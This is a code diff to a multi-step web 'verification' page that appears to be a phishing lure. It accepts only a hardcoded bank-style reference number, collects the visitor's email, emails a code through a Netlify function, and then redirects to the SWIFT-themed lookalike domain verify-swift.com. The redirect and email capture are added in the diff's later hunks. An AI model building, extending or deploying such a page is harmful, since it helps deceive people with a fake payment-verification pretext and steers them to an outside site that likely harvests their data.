@@ -16,6 +16,7 @@
     .error{color:red;margin-top:10px;display:none;font-size:14px;}
     .success{color:green;margin-top:10px;display:none;}
     .loading{display:none;color:#3498db;margin-top:10px;}
+    .debug{font-size:12px;color:#666;margin-top:10px;}
 </style>
 </head>
 <body>
@@ -23,8 +24,9 @@
     <!-- Step 1: Reference Number -->
     <div class="step active" id="step1">
         <h2>Step 1: Reference Number</h2>
-        <input type="text" id="referenceNumber" placeholder="Enter your reference number" required>
+        <input type="text" id="referenceNumber" placeholder="Enter COBA300525CH59279" required>
         <button id="step1Next">Next</button>
+        <div class="error" id="refError"></div>
     </div>
 
     <!-- Step 2: Email -->
@@ -34,6 +36,7 @@
         <button id="sendCode">Send Verification Code</button>
         <div class="loading" id="emailLoading">Sending code...</div>
         <div class="error" id="emailError"></div>
+        <div class="debug" id="debugInfo"></div>
     </div>
 
     <!-- Step 3: Verification Code -->
@@ -48,6 +51,7 @@
     <div class="step" id="step4">
         <h2>Success!</h2>
         <div class="success">Your account has been verified successfully.</div>
+        <div class="loading" id="redirectLoading">Redirecting to verify-swift.com...</div>
     </div>
 </div>
 
@@ -55,6 +59,7 @@
 let currentStep = 1;
 let verificationCode = '';
 let codeExpiry;
+let userEmail = '';
 
 function showStep(step) {
     document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
@@ -67,21 +72,31 @@ function setLoading(button, loading) {
     if (loading) {
         button.disabled = true;
         button.textContent = 'Sending...';
-        emailLoading.style.display = 'block';
+        if (emailLoading) emailLoading.style.display = 'block';
     } else {
         button.disabled = false;
         button.textContent = 'Send Verification Code';
-        emailLoading.style.display = 'none';
+        if (emailLoading) emailLoading.style.display = 'none';
     }
 }
 
 // Step 1: Reference Number
 document.getElementById('step1Next').addEventListener('click', () => {
     const ref = document.getElementById('referenceNumber').value.trim();
-    if (ref !== '') {
+    const refError = document.getElementById('refError');
+    refError.style.display = 'none';
+
+    if (ref === '') {
+        refError.textContent = 'Please enter your reference number';
+        refError.style.display = 'block';
+        return;
+    }
+
+    if (ref === 'COBA300525CH59279') {
         showStep(2);
     } else {
-        alert('Please enter your reference number');
+        refError.textContent = 'Invalid reference number. Please check and try again.';
+        refError.style.display = 'block';
     }
 });
 
@@ -89,15 +104,19 @@ document.getElementById('step1Next').addEventListener('click', () => {
 document.getElementById('sendCode').addEventListener('click', async () => {
     const email = document.getElementById('email').value.trim();
     const emailError = document.getElementById('emailError');
+    const debugInfo = document.getElementById('debugInfo');
     const sendButton = document.getElementById('sendCode');
     
     emailError.style.display = 'none';
+    debugInfo.style.display = 'none';
 
     if (email === '' || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
         emailError.textContent = 'Please enter a valid email address';
         emailError.style.display = 'block';
         return;
     }
+
+    userEmail = email;
 
     // Generate 6-digit code
     verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
@@ -106,29 +125,39 @@ document.getElementById('sendCode').addEventListener('click', async () => {
     setLoading(sendButton, true);
 
     try {
+        console.log('Sending request to function...');
         const response = await fetch('/.netlify/functions/send-email', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
             body: JSON.stringify({ 
                 to: email, 
                 code: verificationCode 
             })
         });
 
+        console.log('Response status:', response.status);
         const data = await response.json();
+        console.log('Response data:', data);
 
         if (data.success) {
             showStep(3);
-            // Auto-focus on code input
             setTimeout(() => document.getElementById('codeInput').focus(), 100);
         } else {
             emailError.textContent = data.message || 'Failed to send verification code';
             emailError.style.display = 'block';
+            debugInfo.textContent = `Error details: ${JSON.stringify(data)}`;
+            debugInfo.style.display = 'block';
         }
 
     } catch (error) {
-        emailError.textContent = 'Network error. Please try again.';
+        console.error('Fetch error:', error);
+        emailError.textContent = `Network error: ${error.message}. Please check console for details.`;
         emailError.style.display = 'block';
+        debugInfo.textContent = 'Make sure the function is deployed and environment variables are set.';
+        debugInfo.style.display = 'block';
     } finally {
         setLoading(sendButton, false);
     }
@@ -140,7 +169,6 @@ document.getElementById('verifyCode').addEventListener('click', () => {
     const codeError = document.getElementById('codeError');
     codeError.style.display = 'none';
 
-    // Check if code expired
     if (Date.now() > codeExpiry) {
         codeError.textContent = 'Verification code has expired. Please request a new one.';
         codeError.style.display = 'block';
@@ -149,6 +177,12 @@ document.getElementById('verifyCode').addEventListener('click', () => {
 
     if (code === verificationCode) {
         showStep(4);
+        document.getElementById('redirectLoading').style.display = 'block';
+        
+        setTimeout(() => {
+            window.location.href = 'https://verify-swift.com/yeni1.html';
+        }, 2000);
+        
     } else {
         codeError.textContent = 'Invalid verification code. Please try again.';
         codeError.style.display = 'block';
